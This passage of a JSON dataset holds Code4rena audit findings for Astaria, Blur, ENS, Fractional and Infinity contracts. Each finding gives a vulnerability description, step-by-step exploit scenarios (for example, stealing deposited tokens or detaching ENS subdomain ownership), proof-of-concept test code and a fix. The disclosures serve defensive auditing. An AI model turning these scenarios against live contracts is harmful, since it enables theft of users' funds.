`&&` operator instead of a `||`. The result is that, even if the auction hasn't started, only the first criteria is false. The second is checking whether the Clearing House owns the underlying collateral, which happens as soon as the collateral is deposited in `CollateralToken.sol#onERC721Received()`:\n\n          ERC721(msg.sender).safeTransferFrom(\n            address(this),\n            s.clearingHouse[collateralId],\n            tokenId_\n          );\n\n### Recommended Mitigation Steps\n\nChange the check in `settleAuction()` from an AND to an OR, which will block any collateralId that isn't currently at auction from being settled:\n\n        if (\n          s.collateralIdToAuction[collateralId] == bytes32(0) ||\n          ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n            s.idToUnderlying[collateralId].tokenId\n          ) !=\n          s.clearingHouse[collateralId]\n        ) {\n          revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n        }\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/287)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Astaria project, which is a decentralized lending platform. The bug is related to the Clearing House, which is implemented as an ERC1155 and used to settle up at the end of an auction. The bug allows any user to call the `safeTransferFrom()` function for any other user's collateral, wiping out all the liens on that collateral and burning the borrower's collateral token.\n\nThe bug occurs when the `safeTransferFrom()` function is called when there is no auction. In this case, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0. This allows any user to call the `safeTransferFrom()` function for any other user's collateral, wiping out all the liens on that collateral and burning the borrower's collateral token.\n\nThe flow of the bug is as follows: the `safeTransferFrom()` function is called, then the `_execute()` function is called, which calculates the amount the auction would currently be listed at. It then confirms that the Clearing House has already received sufficient paymentTokens for this amount, and then transfers the liquidator their payment. It then calls `LienToken#payDebtViaClearingHouse()`, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash, and if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral. Finally, it calls `Collateral#settleAuction()`, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token.\n\nThe bug occurs because there is no check that this `safeTransferFrom()` function is being called after an auction has completed. In addition, the check in `settleAuction()` uses an `&&` operator instead of a `||`, which allows the bug to occur.\n\nThe recommended mitigation steps for this bug are to change the check in `settleAuction()` from an AND to an OR, which will block any collateralId that isn't currently at auction from being settled. SantiagoGregory (Astaria) has confirmed this bug.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-01-astaria",
      "sponsor_name": "Astaria",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/287",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "202",
      "slug": "h-13-anyone-can-wipe-complete-state-of-any-collateral-at-any-point-code4rena-astaria-astaria-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Astaria",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Astaria",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "3803",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 45,
      "protocol_id": "141",
      "title": "[H-01] StandardPolicyERC1155.sol returns amount == 1 instead of amount == order.amount",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-10-blur/blob/main/contracts/matchingPolicies/StandardPolicyERC1155.sol#L12-L36\nhttps://github.com/code-423n4/2022-10-blur/blob/main/contracts/BlurExchange.sol#L154-L161\n\n\n## Vulnerability details\n\n## Impact\n\nThe ```canMatchMakerAsk``` and ```canMatchMakerBid``` functions in ```StandardPolicyERC1155.sol``` will only return 1 as the amount instead of the order.amount value. This value is then used in the ```_executeTokenTransfer``` call during the execution flow and leads to only 1 ERC1155 token being sent. A buyer matching an ERC1155 order wih amount > 1 would expect to receive amount of tokens if they pay the order's price. The seller, who might also expect more than 1 tokens to be sent, would have set the order's price to be for the amount of tokens and not just for 1 token.\n\nThe buyer would lose overspent ETH/WETH to the seller without receiving all tokens as specified in the order.\n\n## Proof of Concept\n\n[StandardPolicyERC1155.sol:canMatchMakerAsk](https://github.com/code-423n4/2022-10-blur/blob/main/contracts/matchingPolicies/StandardPolicyERC1155.sol#L12-L36)\n\n```solidity\n    function canMatchMakerAsk(Order calldata makerAsk, Order calldata takerBid)\n        external\n        pure\n        override\n        returns (\n            bool,\n            uint256,\n            uint256,\n            uint256,\n            AssetType\n        )\n    {\n        return (\n            (makerAsk.side != takerBid.side) &&\n            (makerAsk.paymentToken == takerBid.paymentToken) &&\n            (makerAsk.collection == takerBid.collection) &&\n            (makerAsk.tokenId == takerBid.tokenId) &&\n            (makerAsk.matchingPolicy == takerBid.matchingPolicy) &&\n            (makerAsk.price == takerBid.price),\n            makerAsk.price,\n            makerAsk.tokenId,\n            1,\n            AssetType.ERC1155\n        );\n    }\n```\n\nThe code above shows that ```canMatchMakerAsk``` only returns 1 as the amount. ```_executeTokenTransfer``` will then [call the executionDelegate's ```transferERC1155``` function with only amount 1](https://github.com/code-423n4/2022-10-blur/blob/main/contracts/BlurExchange.sol#L540), transferring only 1 token to the buyer.\n\n\nTest code added to ```execution.test.ts```:\n\n```typescript\n    it('Only 1 ERC1155 received for order with amount > 1', async () => {\n      await mockERC1155.mint(alice.address, tokenId, 10);\n      sell = generateOrder(alice, {\n        side: Side.Sell,\n        tokenId,\n        amount: 10,\n        collection: mockERC1155.address,\n        matchingPolicy: matchingPolicies.standardPolicyERC1155.address,\n      });\n      buy = generateOrder(bob, {\n        side: Side.Buy,\n        tokenId,\n        amount: 10,\n        collection: mockERC1155.address,\n        matchingPolicy: matchingPolicies.standardPolicyERC1155.address,\n      });\n      sellInput = await sell.pack();\n      buyInput = await buy.pack();\n\n      await waitForTx(exchange.execute(sellInput, buyInput));\n\n      // Buyer only receives 1 token\n      expect(await mockERC1155.balanceOf(bob.address, tokenId)).to.be.equal(1);\n      await checkBalances(\n        aliceBalance,\n        aliceBalanceWeth.add(priceMinusFee),\n        bobBalance,\n        bobBalanceWeth.sub(price),\n        feeRecipientBalance,\n        feeRecipientBalanceWeth.add(fee),\n      );\n    });\n```\n\nThe test code above shows a sell order for an ERC1155 token with amount = 10 and a matching buy order. The ```execute``` function in ```BlurExchange.sol``` is called and the orders are matched but the buyer (bob) only receives 1 token instead of 10 despite paying the full price.\n\n## Recommended Mitigation Steps\n\nPolicies used for ERC1155 tokens should return and consider the amount of tokens set for the order.",
      "summary": "\nThis bug report describes an issue with the ```StandardPolicyERC1155.sol``` contract in the BlurExchange. The ```canMatchMakerAsk``` and ```canMatchMakerBid``` functions will only return 1 as the amount instead of the order.amount value, which is then used in the ```_executeTokenTransfer``` call. This leads to only 1 ERC1155 token being sent when a buyer matches an ERC1155 order with amount greater than 1. The buyer would lose overspent ETH/WETH to the seller without receiving all tokens as specified in the order. \n\nA proof of concept has been provided, which includes code from the ```StandardPolicyERC1155.sol``` contract and a test code added to ```execution.test.ts```. The test code shows a sell order for an ERC1155 token with amount = 10 and a matching buy order, but the buyer only receives 1 token instead of 10 despite paying the full price.\n\nThe recommended mitigation step is for policies used for ERC1155 tokens to return and consider the amount of tokens set for the order.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-blur-exchange-contest",
      "sponsor_name": "Blur Exchange",
      "sponsor_link": "https://twitter.com/blur_io",
      "quality_score": 5,
      "general_score": 2,
      "source_link": "https://code4rena.com/reports/2022-10-blur",
      "github_link": "https://github.com/code-423n4/2022-10-blur-findings/issues/666",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "168",
      "slug": "h-01-standardpolicyerc1155sol-returns-amount-1-instead-of-amount-orderamount-code4rena-blur-exchange-blur-exchange-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Blur Exchange",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Blur Exchange",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Wrong Math"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "5542",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 6,
      "protocol_id": "897",
      "title": "[H-01] It is possible to create fake ERC1155 `NameWrapper` token for subdomain, which is not owned by `NameWrapper`",
      "content": "\n[NameWrapper.sol#L820-L821](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821)<br>\n[NameWrapper.sol#L524](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524)<br>\n[NameWrapper.sol#L572](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572)<br>\n\nDue to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.\n\nFake token creation scenario:\n\n1.  `Account1` registers and wraps `test.eth` domain\n2.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain)\n3.  `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1`\n4.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1`\n5.  `Account1` calls function to send ERC1155 token from `Contract1` back to self.\n\nAfter this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.\n\nAt this point, ownership in `NameWrapper` is \"detached\" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:\n\n1.  Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).\n\n2.  Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.\n\n### Proof of Concept\n\nCopy these to test/wrapper and run:<br>\nyarn test test/wrapper/NameWrapperReentrancy.js\n\n<https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e>\n\n### Recommended Mitigation Steps\n\nConsider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):\n\n    function _transferAndBurnFuses(\n        bytes32 node,\n        address newOwner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));\n        _transfer(owner, newOwner, uint256(node), 1, \"\");\n        uint32 curFuses;\n        uint64 curExpiry;\n        (owner, curFuses, curExpiry) = getData(uint256(node));\n        require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);\n        _setFuses(node, newOwner, fuses, expiry);\n    }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/84)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NameWrapper contract of the 2022-07-ENS project. The vulnerability is related to the possibility of re-entrancy in the _transferAndBurnFuses function, which is called from setSubnodeOwner and setSubnodeRecord. This makes it possible to do some stuff in onERC1155Received right after the transfer but before the new owner and new fuses are set. This could lead to the creation of a fake ERC1155 NameWrapper token for a domain which is not owned by NameWrapper.\n\nFor example, an attacker could register and wrap a domain, call setSubnodeOwner to make NameWrapper the owner of the subdomain, create a contract with a function to send the subdomain ERC1155 NameWrapper token back to the attacker, and then call setSubnodeOwner with the contract as the new owner. After this sequence of events, the subdomain will be owned by the attacker both in ENS and in NameWrapper, but some functions in NameWrapper will still work, creating the impression of a good domain.\n\nThe recommended mitigation steps are to consider adding nonReentrant modifiers with ReentrancyGuard implementation from openzeppelin, or to fix the individual re-entrancy issue. A proof of concept can be found in the test/wrapper folder of the project.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-07-ens-contest",
      "sponsor_name": "ENS",
      "sponsor_link": "https://twitter.com/ensdomains",
      "quality_score": 3,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/84",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "145",
      "slug": "h-01-it-is-possible-to-create-fake-erc1155-namewrapper-token-for-subdomain-which-is-not-owned-by-namewrapper-code4rena-ens-ens-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "ENS",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "ENS",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2984",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 7,
      "protocol_id": "187",
      "title": "[H-03] Migration: no check that user-supplied `proposalId` and `vault` match",
      "content": "_Submitted by kenzo, also found by 0x1f8b, bin2chen, codexploder, dipp, minhtrng, and smiling&#95;heretic_\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L111>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L143>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L157>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L164>\n\n### Vulnerability Details\n\nIn Migration, when joining or leaving a migration proposal, Fractional does not check whether the user supplied `proposalId` and `vault` match the actual vault that the proposal belongs to.\n\nThis allows the user to trick the accounting.\n\n### Impact\n\nLoss of funds for users.\n\nMalicious users can withdraw tokens from proposals which have not been committed yet.\n\n### Proof of Concept\n\nLet's say Vault A's FERC1155 token is called TOKEN.\nAlice has deposited 100 TOKEN in Migration to Vault A on proposal ID 1.\n\nNow Malaclypse creates Vault B with token ERIS as FERC1155 and mints 100 tokens to himself.\nHe then calls Migration's `join` with amount as 100, Vault B as `vault`, proposal ID as 1.\nThe function [will get](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L111) ERIS as the token to deposit.\nIt [will pull](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L126) the ERIS from Mal.\nAnd now for the problem - it [will set](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L135) the following variable:\n\n            userProposalFractions[_proposalId][msg.sender] += _amount;\n\nNotice that this does not correspond to the vault number.\n\nNow, Mal will call the `leave` function, this time with Vault A address and proposal ID 1.\nThe function [will get](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L143) the token to send from the vault as TOKEN.\n\nIt [will get](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L155) the amount to withdraw from `userProposalFractions[_proposalId][msg.sender]`, which as we saw previously will be 100.\n\nIt will [deduct](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L156) this amount from `migrationInfo[_vault][_proposalId]`, which won't revert as Alice deposited 100 to this vault and proposal.\n\nAnd finally [it will send](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L164) 100 TOKENs to Mal - although he deposited ERIS.\n\nMal received Alice's valuable tokens.\n\n### Recommended Mitigation Steps\n\nI think that one option would be to save for each proposal which vault it corresponds to.\nThen you can verify that user supplies a matching vault-proposal pair, or he can even just supply proposal and the contract will get the vault from that.\n\nAnother solution would be to have `userProposalFractions` save the relevant vault also, not just a general proposal id.\n\n**[stevennevins (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/208)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/326#issuecomment-1198654944):**\n > The warden's POC shows how an attacker can effectively steal tokens by creating a migration for a new vault with worthless tokens and reusing an existing `proposalId`, then withdrawing valuable tokens from the original proposal. I agree this is a High risk issue.\n\n***\n\n",
      "summary": "\nA bug has been identified in the Migration module of the Fractional project. When joining or leaving a migration proposal, the code does not check whether the user supplied proposal ID and vault match the actual vault that the proposal belongs to. This allows a malicious user to trick the accounting and withdraw tokens from proposals which have not been committed yet, resulting in a loss of funds for users.\n\nA proof of concept was provided to explain the vulnerability. In this example, Alice had deposited 100 tokens in Migration to Vault A on proposal ID 1. Malaclypse then created Vault B with a different token and minted 100 tokens to himself. He then called Migration's `join` with amount as 100, Vault B as `vault`, and proposal ID as 1. As a result, 100 tokens were sent to Mal from Alice's valuable tokens, even though he had deposited a different token.\n\nTwo recommended mitigation steps are provided. One option is to save for each proposal which vault it corresponds to and verify that the user supplies a matching pair, or they can just supply the proposal and the contract will get the vault from that. Another solution is to have `userProposalFractions` save the relevant vault also, not just a general proposal id.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
      "sponsor_name": "Fractional",
      "sponsor_link": "https://twitter.com/fractional_art",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-07-fractional",
      "github_link": "https://github.com/code-423n4/2022-07-fractional-findings/issues/326",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "144",
      "slug": "h-03-migration-no-check-that-user-supplied-proposalid-and-vault-match-code4rena-fractional-fractional-v2-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Fractional",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Fractional",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2983",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "187",
      "title": "[H-02] Forced buyouts can be performed by malicious buyers",
      "content": "_Submitted by cccz_\n\nIn the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238>\n\n### Recommended Mitigation Steps\n\nConsider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth.\n\n**[Ferret-san (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/212)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/212#issuecomment-1217143098):**\n > The 1155 receiver can prevent a failed buyout from ending, which prevents a new one from starting. Agree with severity.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the end function of the Buyout contract. If a buyout fails, ERC1155 tokens are sent to the proposer, but if the proposer is a malicious contract that cannot receive ERC1155 tokens, the end function fails and prevents any new buyout from being started. This bug has been highlighted in the code at the link given in the report. No tools were used to identify the bug.\n\nThe impact of this bug is that it prevents any new buyout from being started. To mitigate this bug, it is recommended to save the status of the proposer after a failed buyout and implement functions to allow the proposer to withdraw the ERC1155 tokens and ETH.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
      "sponsor_name": "Fractional",
      "sponsor_link": "https://twitter.com/fractional_art",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-07-fractional",
      "github_link": "https://github.com/code-423n4/2022-07-fractional-findings/issues/212",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "144",
      "slug": "h-02-forced-buyouts-can-be-performed-by-malicious-buyers-code4rena-fractional-fractional-v2-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Fractional",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Fractional",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2773",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 8,
      "protocol_id": "208",
      "title": "[H-07] `_transferNFTs()` succeeds even if no transfer is performed",
      "content": "_Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron_\n\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n### Proof of Concept\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9>\n\n### Recommended Mitigation Steps\n\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):**\n> If `supportsInterface` returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n> \n> A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange.sol contract code on GitHub. If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. This means that the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This vulnerability can occur in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly; 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces; and 3. a malicious contract that is deployed to take advantage of this behavior. A proof of concept is provided to demonstrate the vulnerability. The recommended mitigation steps are to either revert if neither the ERC-721 nor the ERC-1155 interface is supported, or to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-07-_transfernfts-succeeds-even-if-no-transfer-is-performed-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2772",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "208",
      "title": "[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`",
      "content": "_Submitted by PwnedNoMore_\n\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.\n\nFor example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d\\&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n```\n\nThe code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support 